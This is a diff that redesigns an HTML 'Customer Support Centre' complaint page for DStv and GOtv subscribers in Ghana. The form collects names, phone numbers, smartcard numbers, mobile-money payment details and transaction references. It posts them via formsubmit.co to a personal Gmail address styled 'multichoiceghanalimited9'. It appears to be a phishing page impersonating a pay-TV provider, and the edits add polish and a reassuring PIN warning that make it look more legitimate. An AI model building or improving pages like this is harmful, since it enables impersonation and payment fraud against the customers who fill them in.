@@ -3,40 +3,238 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Customer Support & Payment Resolution Centre</title>
+
+<title>Customer Support Centre</title>
+
 <style>
-*{box-sizing:border-box}
-body{margin:0;font-family:Arial,sans-serif;background:#f3f5f9;color:#222}
-header{background:#082b55;color:white;padding:25px 15px;text-align:center}
-header h1{margin:0;font-size:25px}
-header p{margin-bottom:0}
-.container{max-width:750px;margin:30px auto;padding:20px}
-.card{background:white;padding:25px;border-radius:12px;box-shadow:0 3px 15px #0001}
-h2{color:#082b55}
-label{display:block;margin-top:16px;font-weight:bold}
-input,select,textarea{width:100%;padding:13px;margin-top:7px;border:1px solid #ccc;border-radius:6px;font-size:15px}
-button{background:#087bdb;color:white;border:0;padding:15px;width:100%;margin-top:22px;border-radius:6px;font-size:16px;cursor:pointer}
-button:hover{background:#065ca5}
-.notice{background:#eaf3ff;padding:15px;border-radius:6px;margin:20px 0}
-footer{text-align:center;padding:25px;color:#777}
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background: #f4f6fa;
+    color: #263448;
+}
+
+header {
+    background: #082d55;
+    color: white;
+    padding: 18px 7%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+}
+
+.logo-area {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+}
+
+.logo-area img {
+    max-width: 65px;
+    max-height: 55px;
+    object-fit: contain;
+}
+
+.logo-area h2 {
+    font-size: 20px;
+}
+
+nav a {
+    color: white;
+    text-decoration: none;
+    margin-left: 22px;
+    font-size: 14px;
+}
+
+.hero {
+    background: linear-gradient(120deg, #082d55, #1268a5);
+    color: white;
+    padding: 75px 8%;
+    text-align: center;
+}
+
+.hero h1 {
+    font-size: 36px;
+    margin-bottom: 18px;
+}
+
+.hero p {
+    font-size: 17px;
+    line-height: 1.7;
+    max-width: 650px;
+    margin: auto;
+}
+
+.container {
+    max-width: 900px;
+    margin: 40px auto;
+    padding: 20px;
+}
+
+.card {
+    background: white;
+    padding: 35px;
+    border-radius: 12px;
+    box-shadow: 0 5px 25px rgba(0,0,0,.06);
+}
+
+.card h2 {
+    color: #082d55;
+    margin-bottom: 12px;
+}
+
+.description {
+    color: #667085;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+.section-title {
+    color: #1268a5;
+    font-size: 17px;
+    margin: 28px 0 10px;
+    border-bottom: 1px solid #e5e9ef;
+    padding-bottom: 10px;
+}
+
+label {
+    display: block;
+    font-weight: 600;
+    font-size: 14px;
+    margin-top: 18px;
+}
+
+input, select, textarea {
+    width: 100%;
+    padding: 14px;
+    margin-top: 8px;
+    border: 1px solid #d7dce5;
+    border-radius: 7px;
+    font-size: 15px;
+    background: #fff;
+}
+
+input:focus, select:focus, textarea:focus {
+    outline: none;
+    border-color: #1268a5;
+}
+
+button {
+    width: 100%;
+    padding: 16px;
+    margin-top: 28px;
+    background: #0878c9;
+    border: none;
+    color: white;
+    border-radius: 7px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #065c9b;
+}
+
+.notice {
+    background: #eef5fc;
+    padding: 16px;
+    border-radius: 7px;
+    margin-top: 22px;
+    font-size: 13px;
+    line-height: 1.6;
+}
+
+footer {
+    background: #082d55;
+    color: white;
+    text-align: center;
+    padding: 30px 15px;
+    margin-top: 50px;
+    line-height: 2;
+}
+
+@media(max-width:600px) {
+    header {
+        justify-content: center;
+        gap: 15px;
+    }
+
+    nav {
+        text-align: center;
+    }
+
+    nav a {
+        margin: 0 8px;
+    }
+
+    .hero h1 {
+        font-size: 27px;
+    }
+
+    .card {
+        padding: 22px;
+    }
+}
 </style>
 </head>
+
 <body>
 
 <header>
-<h1>Customer Support & Payment Resolution Centre</h1>
-<p>Submit your payment complaints and subscription enquiries.</p>
+
+<div class="logo-area">
+
+<!-- Add your authorized logo file as logo.png -->
+<img src="logo.png" alt="Company Logo"
+onerror="this.style.display='none'">
+
+<h2>Customer Support Centre</h2>
+
+</div>
+
+<nav>
+<a href="#home">Home</a>
+<a href="#complaint">Submit Complaint</a>
+</nav>
+
 </header>
 
-<div class="container">
+<section class="hero" id="home">
+
+<h1>How Can We Help You?</h1>
+
+<p>
+Welcome to the Customer Support and Payment Resolution Centre.
+Submit your enquiries and payment complaints for review by our support team.
+</p>
+
+</section>
+
+<div class="container" id="complaint">
+
 <div class="card">
+
 <h2>Customer Complaint Form</h2>
-<p>Please provide accurate information so our support team can review your request.</p>
 
-<form action="https://formsubmit.co/multichoiceghanalimited9@gmail.com" method="POST">
+<p class="description">
+Please complete the form below with accurate information.
+Our support team will review your submission.
+</p>
 
-<input type="hidden" name="_subject" value="New Customer Payment Complaint">
-<input type="hidden" name="_captcha" value="true">
+<form action="https://formsubmit.co/multichoiceghanalimited9@gmail.com"
+method="POST">
+
+<input type="hidden" name="_subject"
+value="New Customer Support Request">
+
+<h3 class="section-title">01. Customer Information</h3>
 
 <label>Full Name</label>
 <input type="text" name="Full Name" required>
@@ -47,9 +245,11 @@ footer{text-align:center;padding:25px;color:#777}
 <label>Email Address</label>
 <input type="email" name="Email">
 
+<h3 class="section-title">02. Subscription Information</h3>
+
 <label>Service Type</label>
 <select name="Service Type" required>
-<option value="">Select service</option>
+<option value="">Select Service</option>
 <option>DStv</option>
 <option>GOtv</option>
 <option>Other</option>
@@ -58,12 +258,15 @@ footer{text-align:center;padding:25px;color:#777}
 <label>IUC / Smartcard Number</label>
 <input type="text" name="IUC Number" required>
 
-<label>Amount Paid (GHS)</label>
-<input type="number" name="Amount Paid" min="0" step="0.01" required>
+<h3 class="section-title">03. Payment Information</h3>
 
-<label>Payment Network</label>
-<select name="Payment Network" required>
-<option value="">Select network</option>
+<label>Amount Paid (GHS)</label>
+<input type="number" name="Amount Paid"
+min="0" step="0.01" required>
+
+<label>Payment Method</label>
+<select name="Payment Method" required>
+<option value="">Select Payment Method</option>
 <option>MTN MoMo</option>
 <option>Telecel Cash</option>
 <option>AT Money</option>
@@ -71,22 +274,38 @@ footer{text-align:center;padding:25px;color:#777}
 <option>Other</option>
 </select>
 
-<label>Transaction ID</label>
-<input type="text" name="Transaction ID" required>
+<label>Transaction Reference</label>
+<input type="text" name="Transaction Reference" required>
 
 <label>Payment Date</label>
 <input type="date" name="Payment Date" required>
 
+<h3 class="section-title">04. Complaint Details</h3>
+
 <label>Describe Your Complaint</label>
-<textarea name="Complaint Details" rows="5" required></textarea>
-<button type="submit">Send Request</button>
+<textarea name="Complaint Details"
+rows="5" required></textarea>
+
+<div class="notice">
+Your information will be used to review your support request.
+Never submit your MoMo PIN, password, OTP or banking login details.
+</div>
+
+<button type="submit">Submit Request</button>
 
 </form>
+
 </div>
 </div>
 
 <footer>
-Customer Support & Payment Resolution Centre
+
+<p>Customer Support & Payment Resolution Centre</p>
+
+<p>Customer Assistance Portal</p>
+
+<p>© 2026 All Rights Reserved.</p>
+
 </footer>
 
 </body>
